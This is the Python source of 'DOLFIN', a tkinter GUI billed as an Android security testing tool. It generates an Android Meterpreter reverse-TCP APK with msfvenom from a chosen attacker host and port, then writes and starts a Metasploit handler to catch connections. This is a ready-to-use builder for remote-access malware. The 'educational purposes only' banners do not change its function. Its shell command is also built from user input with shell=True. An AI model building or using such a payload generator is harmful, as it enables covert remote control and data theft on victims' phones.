import os
import subprocess
import tkinter as tk
from tkinter import messagebox, filedialog
from tkinter import ttk
from PIL import Image, ImageTk
import time

# Function to toggle listener button color
def toggle_listener_button():
    if listener_var.get():
        listener_checkbox.config(bg="green", activebackground="green", fg="black")
    else:
        listener_checkbox.config(bg="red", activebackground="red", fg="white")

# Function to generate payload
def generate_payload():
    lhost = lhost_entry.get()
    lport = lport_entry.get()
    output_file = output_entry.get()
    listener_port = listener_port_entry.get()

    if not lhost or not lport or not output_file or not listener_port:
        messagebox.showerror("Error", "Please fill in all fields.")
        return

    payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output_file}"
    
    try:
        log_text.insert(tk.END, "[*] Generating payload...\n")
        subprocess.run(payload_command, shell=True, check=True)
        log_text.insert(tk.END, f"[+] Payload generated: {output_file}\n")
    except subprocess.CalledProcessError as e:
        log_text.insert(tk.END, f"[!] Error generating payload: {e}\n")
        messagebox.showerror("Error", "Failed to generate payload.")
        return

    if listener_var.get():
        start_listener(listener_port)

# Function to start the listener in Metasploit
def start_listener(lport):
    listener_config = f"""
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT {lport}
exploit
"""
    with open("listener.rc", "w") as f:
        f.write(listener_config)

    log_text.insert(tk.END, "[*] Starting Metasploit listener...\n")
    try:
        subprocess.Popen(["msfconsole", "-r", "listener.rc"])
        log_text.insert(tk.END, "[+] Listener started. Waiting for connections...\n")
    except Exception as e:
        log_text.insert(tk.END, f"[!] Failed to start listener: {e}\n")
        messagebox.showerror("Error", "Failed to start listener.")

# Browse output file location
def browse_output():
    file_path = filedialog.asksaveasfilename(defaultextension=".apk", filetypes=[("APK files", "*.apk")])
    if file_path:
        output_entry.delete(0, tk.END)
        output_entry.insert(0, file_path)

# Function to build the payload window
def build_payload():
    payload_window = tk.Toplevel(root)
    payload_window.title("Build Payload")
    payload_window.geometry("600x580")
    payload_window.configure(bg="black")

    tk.Label(payload_window, text="Enter Payload Details", font=("Algerian", 14, "bold"), bg="black", fg="red").pack(pady=10)

    tk.Label(payload_window, text="ip/HOST:", font=("Algerian", 12), bg="black", fg="white").pack(anchor="w", padx=20)
    global lhost_entry
    lhost_entry = tk.Entry(payload_window, font=("Algerian", 12), bg="white", fg="black")
    lhost_entry.pack(pady=5, padx=20)

    tk.Label(payload_window, text="attacking PORT:", font=("Algerian", 12), bg="black", fg="white").pack(anchor="w", padx=20)
    global lport_entry
    lport_entry = tk.Entry(payload_window, font=("Algerian", 12), bg="white", fg="black")
    lport_entry.pack(pady=5, padx=20)

    tk.Label(payload_window, text="Output File Path:", font=("Algerian", 12), bg="black", fg="white").pack(anchor="w", padx=20)
    global output_entry
    output_entry = tk.Entry(payload_window, font=("Algerian", 12), bg="white", fg="black")
    output_entry.pack(pady=5, padx=20)

    tk.Label(payload_window, text="Listener Port:", font=("Algerian", 12), bg="black", fg="white").pack(anchor="w", padx=20)
    global listener_port_entry
    listener_port_entry = tk.Entry(payload_window, font=("Algerian", 12), bg="white", fg="black")
    listener_port_entry.pack(pady=5, padx=20)

    browse_button = tk.Button(payload_window, text="Browse", font=("Algerian", 12), bg="red", fg="black", command=browse_output)
    browse_button.pack(pady=10)

    global listener_checkbox
    listener_checkbox = tk.Checkbutton(payload_window, text="Start Listener", font=("Algerian", 12), bg="red", fg="white",
                                       selectcolor="black", variable=listener_var, command=toggle_listener_button)
    listener_checkbox.pack(pady=10)

    generate_button = tk.Button(payload_window, text="Generate", font=("Algerian", 12, "bold"), bg="red", fg="black",
                                 activebackground="black", activeforeground="red", command=generate_payload)
    generate_button.pack(pady=20)



  # Footer with description of Metasploit listener
    footer_label = tk.Label(payload_window, text="It will use Metasploit for listening in this version 1.0", font=("Algerian", 10), bg="black", fg="red")
    footer_label.pack(side="bottom", pady=10)


def loading_screen():
    load_window = tk.Toplevel()
    load_window.title("Loading")
    load_window.geometry("700x650")
    load_window.configure(bg="black")

    # Window dimensions
    window_width = 650
    window_height = 700

    # Get the screen width and height
    screen_width = load_window.winfo_screenwidth()
    screen_height = load_window.winfo_screenheight()

    # Calculate the x and y coordinates for centering the window
    x_coordinate = (screen_width // 2) - (window_width // 2)
    y_coordinate = (screen_height // 2) - (window_height // 2)

    # Set the geometry of the window with centering
    load_window.geometry(f"{window_width}x{window_height}+{x_coordinate}+{y_coordinate}")
    load_window.configure(bg="black")




    # Add loading text
    tk.Label(load_window, text="Loading DOLFIN...(FREE VERSION)", font=("Algerian", 16, "bold"), fg="red", bg="black").pack(pady=20)

    # Add progress bar
    progress = ttk.Progressbar(load_window, orient=tk.HORIZONTAL, length=400, mode="determinate", style="red.Horizontal.TProgressbar")
    progress.pack(pady=20)

    # Add the image with resizing
    try:
        # Check if image exists
        image_path = "imps/logo.jpg"
        if not os.path.exists(image_path):
            raise FileNotFoundError(f"Image file not found at path: {image_path}")

        # Load and resize the image to a larger size
        progress_image = Image.open(image_path)
        progress_image = progress_image.resize((300, 300), Image.Resampling.LANCZOS)  # Resize image to 100x100
        progress_photo = ImageTk.PhotoImage(progress_image)

        # Create a label for the image and pack it
        progress_image_label = tk.Label(load_window, image=progress_photo, bg="black")
        progress_image_label.image = progress_photo
        progress_image_label.pack(pady=10)

    except Exception as e:
        print(f"Error loading image: {e}")
        # If image is not found or there's an error, show a fallback message
        tk.Label(load_window, text=f"Error loading image: {e}", font=("Arial", 14), bg="black", fg="red").pack(pady=10)

    # Add version and contact information
    tk.Label(load_window, text="@ethicalphoenix", font=("Algerian", 12), fg="red", bg="black").pack(pady=5)
    tk.Label(load_window, text="Telegram: https://t.me/ethicalphoenix", font=("Algerian", 12), fg="red", bg="black").pack(pady=5)
    tk.Label(load_window, text="Version: 1.0", font=("Algerian", 12), fg="red", bg="black").pack(pady=5)


  # Add footer with testing message
    footer_label = tk.Label(load_window, text="! TESTING PURPOSE ONLY !", font=("Algerian", 16, "bold"), fg="red", bg="black")
    footer_label.pack(side="bottom", pady=10)
    # Progress bar simulation
    for i in range(100):
        progress["value"] = i + 1
        load_window.update()
        time.sleep(0.1)  # Simulates 10 seconds total

    load_window.destroy()  # Close the loading window after the loading is done
    start_main_app()  # Directly call the main app function after destroying loading screen


# Start Main Application
def start_main_app():
    # Top Banner
    top_frame = tk.Frame(root, bg="red", height=60)
    top_frame.pack(fill="x")

    tk.Label(top_frame, text="|------------DOLFIN TESTER-----------|", font=("Algerian", 20, "bold"), bg="red", fg="black").pack(side="top", pady=5)

    # Buttons Frame
    buttons_frame = tk.Frame(top_frame, bg="red")
    buttons_frame.pack(side="bottom")

    build_button = tk.Button(buttons_frame, text="BUILD", font=("Algerian", 12, "bold"), bg="black", fg="red", width=10, command=build_payload)
    build_button.pack(side="left", padx=10)

    # Log Box
    log_frame = tk.Frame(root, bg="black")
    log_frame.pack(fill="x", pady=10)

    global log_text
    log_text = tk.Text(log_frame, height=8, bg="black", fg="#39FF14", font=("Courier", 16, "bold"))
    log_text.pack(fill="both", padx=10, pady=5)

    # Add Background Image
    try:
        map_image = Image.open("imps/bg.jpg")
        map_image = map_image.resize((860, 400), Image.Resampling.LANCZOS)
        map_photo = ImageTk.PhotoImage(map_image)

        map_label = tk.Label(root, image=map_photo, bg="black")
        map_label.image = map_photo
        map_label.pack(fill="both", expand=True, padx=20, pady=5)
    except Exception as e:
        map_label = tk.Label(root, text=f"[ERROR LOADING IMAGE: {e}]", font=("Arial", 14, "bold"), bg="black", fg="red")
        map_label.pack(fill="both", expand=True, padx=20, pady=5)

    # Footer
    footer_label = tk.Label(root, text="EDUCATIONAL PURPOSES ONLY", font=("Algerian", 12), bg="black", fg="red")
    footer_label.pack(side="bottom", pady=5)

    root.deiconify()

# Main Application Initialization
root = tk.Tk()
root.withdraw()

root.title("DOLFIN - Legal Android Security Testing Tool(FREE VERSION)")

listener_var = tk.BooleanVar()

loading_screen()
root.mainloop()
